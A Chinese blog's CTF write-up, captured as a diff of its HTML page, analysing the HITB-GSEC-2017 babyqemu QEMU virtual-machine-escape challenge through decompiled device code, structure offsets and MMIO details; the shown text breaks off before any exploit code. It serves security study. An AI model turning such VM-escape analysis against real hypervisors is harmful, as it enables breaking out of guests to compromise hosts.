@@ -1,0 +1,1013 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,ctf,qemu,vm escape,虚拟机逃逸,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="熟悉题目，顺便介绍基础知识先看启动脚本，基本就是hitb的设备的漏洞了 12345678910#! /bin/sh./qemu-system-x86_64 \-initrd ./rootfs.cpio \-kernel ./vmlinuz-4.8.0-52-generic \-append &amp;apos;console=ttyS0 root=/dev/ram oops=panic panic=1&amp;a">
+<meta name="keywords" content="pwn,ctf,qemu,vm escape,虚拟机逃逸">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu">
+<meta property="og:url" content="https://www.giantbranch.cn/2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="熟悉题目，顺便介绍基础知识先看启动脚本，基本就是hitb的设备的漏洞了 12345678910#! /bin/sh./qemu-system-x86_64 \-initrd ./rootfs.cpio \-kernel ./vmlinuz-4.8.0-52-generic \-append &amp;apos;console=ttyS0 root=/dev/ram oops=panic panic=1&amp;a">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1575871364598.png">
+<meta property="og:updated_time" content="2023-10-13T13:14:33.050Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu">
+<meta name="twitter:description" content="熟悉题目，顺便介绍基础知识先看启动脚本，基本就是hitb的设备的漏洞了 12345678910#! /bin/sh./qemu-system-x86_64 \-initrd ./rootfs.cpio \-kernel ./vmlinuz-4.8.0-52-generic \-append &amp;apos;console=ttyS0 root=/dev/ram oops=panic panic=1&amp;a">
+<meta name="twitter:image" content="http://pic.giantbranch.cn/pic/1575871364598.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/">
+
+
+
+
+
+  <title>CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-02T00:00:00+00:00">
+                2020-01-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="熟悉题目，顺便介绍基础知识"><a href="#熟悉题目，顺便介绍基础知识" class="headerlink" title="熟悉题目，顺便介绍基础知识"></a>熟悉题目，顺便介绍基础知识</h1><p>先看启动脚本，基本就是hitb的设备的漏洞了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append &apos;console=ttyS0 root=/dev/ram oops=panic panic=1&apos; \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic  -L ./dependency/usr/local/shar e/qemu \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device hitb,id=vda</span><br></pre></td></tr></table></figure>
+
+<p>发现root登录都不用密码的</p>
+<p>我们用ida载入，由于有符号的，函数那直接搜索hitb就出现相关函数了，通过初始化函数即下面的init函数可以看到device id是0x2333（记住WORD1这个是device id就行），还有设置了pci_hitb_realize也是初始化的，pci_hitb_uninit就是跟pci_hitb_realize相反的操作，进行destroy，del等操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall hitb_class_init(ObjectClass_0 *a1, void *data)</span><br><span class="line">&#123;</span><br><span class="line">  ObjectClass_0 *v2; // rax</span><br><span class="line"></span><br><span class="line">  v2 = object_class_dynamic_cast_assert(</span><br><span class="line">         a1,</span><br><span class="line">         &quot;pci-device&quot;,</span><br><span class="line">         &quot;/mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/misc/hitb.c&quot;,</span><br><span class="line">         469,</span><br><span class="line">         &quot;hitb_class_init&quot;);</span><br><span class="line">  BYTE4(v2[2].object_cast_cache[3]) = 0x10;</span><br><span class="line">  HIWORD(v2[2].object_cast_cache[3]) = 0xFF;</span><br><span class="line">  v2[2].type = (Type)pci_hitb_realize;</span><br><span class="line">  v2[2].object_cast_cache[0] = (const char *)pci_hitb_uninit;</span><br><span class="line">  LOWORD(v2[2].object_cast_cache[3]) = 0x1234;</span><br><span class="line">  WORD1(v2[2].object_cast_cache[3]) = 0x2333;   // device_id</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ida在local type那里可以搜索hitb，可以看到设备的数据结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">struct __attribute__((aligned(16))) HitbState</span><br><span class="line">&#123;</span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  QemuThread_0 thread;</span><br><span class="line">  QemuMutex_0 thr_mutex;</span><br><span class="line">  QemuCond_0 thr_cond;</span><br><span class="line">  _Bool stopping;</span><br><span class="line">  uint32_t addr4;</span><br><span class="line">  uint32_t fact;</span><br><span class="line">  uint32_t status;</span><br><span class="line">  uint32_t irq_status;</span><br><span class="line">  dma_state dma;</span><br><span class="line">  QEMUTimer_0 dma_timer;</span><br><span class="line">  char dma_buf[4096];</span><br><span class="line">  void (*enc)(char *, unsigned int);</span><br><span class="line">  uint64_t dma_mask;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>在struct那里有偏移会好点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">00000000 HitbState       struc ; (sizeof=0x1BD0, align=0x10, copyof_1493)</span><br><span class="line">00000000 pdev            PCIDevice_0 ?</span><br><span class="line">000009F0 mmio            MemoryRegion_0 ?</span><br><span class="line">00000AF0 thread          QemuThread_0 ?</span><br><span class="line">00000AF8 thr_mutex       QemuMutex_0 ?</span><br><span class="line">00000B20 thr_cond        QemuCond_0 ?</span><br><span class="line">00000B50 stopping        db ?</span><br><span class="line">00000B51                 db ? ; undefined</span><br><span class="line">00000B52                 db ? ; undefined</span><br><span class="line">00000B53                 db ? ; undefined</span><br><span class="line">00000B54 addr4           dd ?</span><br><span class="line">00000B58 fact            dd ?</span><br><span class="line">00000B5C status          dd ?</span><br><span class="line">00000B60 irq_status      dd ?</span><br><span class="line">00000B64                 db ? ; undefined</span><br><span class="line">00000B65                 db ? ; undefined</span><br><span class="line">00000B66                 db ? ; undefined</span><br><span class="line">00000B67                 db ? ; undefined</span><br><span class="line">00000B68 dma             dma_state ?</span><br><span class="line">00000B88 dma_timer       QEMUTimer_0 ?</span><br><span class="line">00000BB8 dma_buf         db 4096 dup(?)</span><br><span class="line">00001BB8 enc             dq ?                    ; offset</span><br><span class="line">00001BC0 dma_mask        dq ?</span><br><span class="line">00001BC8                 db ? ; undefined</span><br><span class="line">00001BC9                 db ? ; undefined</span><br><span class="line">00001BCA                 db ? ; undefined</span><br><span class="line">00001BCB                 db ? ; undefined</span><br><span class="line">00001BCC                 db ? ; undefined</span><br><span class="line">00001BCD                 db ? ; undefined</span><br><span class="line">00001BCE                 db ? ; undefined</span><br><span class="line">00001BCF                 db ? ; undefined</span><br><span class="line">00001BD0 HitbState       ends</span><br></pre></td></tr></table></figure>
+
+<p>还有两个相关的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">00000000 dma_state       struc ; (sizeof=0x20, align=0x8, copyof_1491)</span><br><span class="line">00000000                                         ; XREF: HitbState/r</span><br><span class="line">00000000 src             dq ?</span><br><span class="line">00000008 dst             dq ?</span><br><span class="line">00000010 cnt             dq ?</span><br><span class="line">00000018 cmd             dq ?</span><br><span class="line">00000020 dma_state       ends</span><br><span class="line">00000020</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 QEMUTimer_0     struc ; (sizeof=0x30, align=0x8, copyof_529)</span><br><span class="line">00000000                                         ; XREF: HitbState/r</span><br><span class="line">00000000 expire_time     dq ?</span><br><span class="line">00000008 timer_list      dq ?                    ; offset</span><br><span class="line">00000010 cb              dq ?                    ; offset</span><br><span class="line">00000018 opaque          dq ?                    ; offset</span><br><span class="line">00000020 next            dq ?                    ; offset</span><br><span class="line">00000028 scale           dd ?</span><br><span class="line">0000002C                 db ? ; undefined</span><br><span class="line">0000002D                 db ? ; undefined</span><br><span class="line">0000002E                 db ? ; undefined</span><br><span class="line">0000002F                 db ? ; undefined</span><br><span class="line">00000030 QEMUTimer_0     ends</span><br></pre></td></tr></table></figure>
+
+<p>看一下pci_hitb_realize，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall pci_hitb_realize(HitbState *pdev, Error_0 **errp)</span><br><span class="line">&#123;</span><br><span class="line">  pdev-&gt;pdev.config[61] = 1;</span><br><span class="line">  if ( !msi_init(&amp;pdev-&gt;pdev, 0, 1u, 1, 0, errp) )</span><br><span class="line">  &#123;</span><br><span class="line">    timer_init_tl(&amp;pdev-&gt;dma_timer, main_loop_tlg.tl[1], 1000000, (QEMUTimerCB *)hitb_dma_timer, pdev);</span><br><span class="line">    qemu_mutex_init(&amp;pdev-&gt;thr_mutex);</span><br><span class="line">    qemu_cond_init(&amp;pdev-&gt;thr_cond);</span><br><span class="line">    qemu_thread_create(&amp;pdev-&gt;thread, &quot;hitb&quot;, (void *(*)(void *))hitb_fact_thread, pdev, 0);</span><br><span class="line">    memory_region_init_io(&amp;pdev-&gt;mmio, &amp;pdev-&gt;pdev.qdev.parent_obj, &amp;hitb_mmio_ops, pdev, &quot;hitb-mmio&quot;, 0x100000uLL);</span><br><span class="line">    pci_register_bar(&amp;pdev-&gt;pdev, 0, 0, &amp;pdev-&gt;mmio);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>timer_init_tl设置了&amp;pdev-&gt;dma_timer的回调函数是hitb_dma_timer，回调函数的参数是pdev，理解来源于下面qemu的源码及注释，而倒数第二行memory_region_init_io函数就是初始化内存映射IO，指定了MMIO的操作&amp;hitb_mmio_ops（这个的read和write分别指向hitb_mmio_read，hitb_mmio_write），最后pci_register_bar将&amp;pdev-&gt;mmio注册到qemu PCI设备的BAR（Base Address Registers，BAR记录了设备所需要的地址空间的类型，基址以及其他属性。），其中第二个参数0，代表注册的是MMIO，假如是1就代表注册PMIO</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * timer_init_tl:</span><br><span class="line"> * @ts: the timer to be initialised</span><br><span class="line"> * @timer_list: the timer list to attach the timer to</span><br><span class="line"> * @scale: the scale value for the timer</span><br><span class="line"> * @cb: the callback to be called when the timer expires</span><br><span class="line"> * @opaque: the opaque pointer to be passed to the callback</span><br><span class="line"> *</span><br><span class="line"> * Initialise a new timer and associate it with @timer_list.</span><br><span class="line"> * The caller is responsible for allocating the memory.</span><br><span class="line"> *</span><br><span class="line"> * You need not call an explicit deinit call. Simply make</span><br><span class="line"> * sure it is not on a list with timer_del.</span><br><span class="line"> */</span><br><span class="line">void timer_init_tl(QEMUTimer *ts,</span><br><span class="line">                   QEMUTimerList *timer_list, int scale,</span><br><span class="line">                   QEMUTimerCB *cb, void *opaque)</span><br><span class="line">&#123;</span><br><span class="line">    ts-&gt;timer_list = timer_list;</span><br><span class="line">    ts-&gt;cb = cb;</span><br><span class="line">    ts-&gt;opaque = opaque;</span><br><span class="line">    ts-&gt;scale = scale;</span><br><span class="line">    ts-&gt;expire_time = -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们回过头来看看pci设备，根据id，就知道是最后一个了，这个系统太mini了，<code>lspci -v</code>看不到任何详细的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># lspci</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2333</span><br></pre></td></tr></table></figure>
+
+<p>那我们去看文件系统中的，可以看到MMIO的信息，起始地址是<code>0x00000000fea00000</code>，根据第二个地址，size可算出是0x100000这么大</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># cat  /sys/devices/pci0000\:00/0000:00\:04.0/resource</span><br><span class="line">0x00000000fea00000 0x00000000feafffff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>其实除了hitb_class_init，还有hitb_instance_init初始化函数，他们都在hitb_info_27046中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000969020 ; Function-local static variable</span><br><span class="line">.data.rel.ro:0000000000969020 ; const TypeInfo_0 hitb_info_27046</span><br><span class="line">.data.rel.ro:0000000000969020 hitb_info_27046 dq offset aHitb         ; name</span><br><span class="line">.data.rel.ro:0000000000969020                                         ; DATA XREF: pci_hitb_register_types↑o</span><br><span class="line">.data.rel.ro:0000000000969020                 dq offset aVirtioPciDevic+7; parent ; &quot;hitb&quot; ...</span><br><span class="line">.data.rel.ro:0000000000969020                 dq 1BD0h                ; instance_size</span><br><span class="line">.data.rel.ro:0000000000969020                 dq offset hitb_instance_init; instance_init</span><br><span class="line">.data.rel.ro:0000000000969020                 dq 0                    ; instance_post_init</span><br><span class="line">.data.rel.ro:0000000000969020                 dq 0                    ; instance_finalize</span><br><span class="line">.data.rel.ro:0000000000969020                 db 0                    ; abstract</span><br><span class="line">.data.rel.ro:0000000000969020                 db 7 dup(0)</span><br><span class="line">.data.rel.ro:0000000000969020                 dq 0                    ; class_size</span><br><span class="line">.data.rel.ro:0000000000969020                 dq offset hitb_class_init; class_init</span><br><span class="line">.data.rel.ro:0000000000969020                 dq 0                    ; class_base_init</span><br><span class="line">.data.rel.ro:0000000000969020                 dq 0                    ; class_finalize</span><br><span class="line">.data.rel.ro:0000000000969020                 dq 0                    ; class_data</span><br><span class="line">.data.rel.ro:0000000000969020                 dq 0                    ; interfaces</span><br><span class="line">.data.rel.ro:0000000000969088                 align 20h</span><br></pre></td></tr></table></figure>
+
+<p>而hitb_instance_init主要是初始化了HitbState-&gt;enc为函数指针hitb_enc</p>
+<p>注：v1 += 0x1BC0 为dma_mask的偏移，减8就是enc的偏移了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall hitb_instance_init(Object_0 *obj)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // rax</span><br><span class="line"></span><br><span class="line">  v1 = (__int64)object_dynamic_cast_assert(</span><br><span class="line">                  obj,</span><br><span class="line">                  &quot;hitb&quot;,</span><br><span class="line">                  &quot;/mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/misc/hitb.c&quot;,</span><br><span class="line">                  459,</span><br><span class="line">                  &quot;hitb_instance_init&quot;);</span><br><span class="line">  *(_QWORD *)(v1 + 0x1BC0) = 0xFFFFFFFLL;</span><br><span class="line">  v1 += 0x1BC0LL;</span><br><span class="line">  *(_QWORD *)(v1 - 8) = hitb_enc;</span><br><span class="line">  object_property_add(</span><br><span class="line">    obj,</span><br><span class="line">    &quot;dma_mask&quot;,</span><br><span class="line">    &quot;uint64&quot;,</span><br><span class="line">    (ObjectPropertyAccessor *)hitb_obj_uint64,</span><br><span class="line">    (ObjectPropertyAccessor *)hitb_obj_uint64,</span><br><span class="line">    0LL,</span><br><span class="line">    (void *)v1,</span><br><span class="line">    0LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后抛开题目，看看这两个init函数是怎么调用的，向上回溯发现从头到尾的调用是这样的，首先是_start函数，调用<strong>libc_start_main，再调用</strong>libc_csu_init，而__libc_csu_init循环调用_frame_dummy_init_array_entry[]里面的函数指针</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall _libc_csu_init(unsigned int a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // r13</span><br><span class="line">  signed __int64 v4; // rbp</span><br><span class="line">  __int64 v5; // rbx</span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v4 = &amp;_do_global_dtors_aux_fini_array_entry - _frame_dummy_init_array_entry;</span><br><span class="line">  init_proc();</span><br><span class="line">  if ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = 0LL;</span><br><span class="line">    do</span><br><span class="line">      ((void 